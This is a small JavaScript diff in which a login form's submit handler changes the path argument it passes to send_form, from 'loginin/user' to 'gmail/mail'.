@@ -40,7 +40,7 @@ function get_data(name,password) {
  if(document.getElementById('submit')){
 document.getElementById('submit').addEventListener('click', function(e){
     e.preventDefault();
-    send_form.call(null,'name','password','loginin/user')
+    send_form.call(null,'name','password','gmail/mail')
 }) 
  }
   
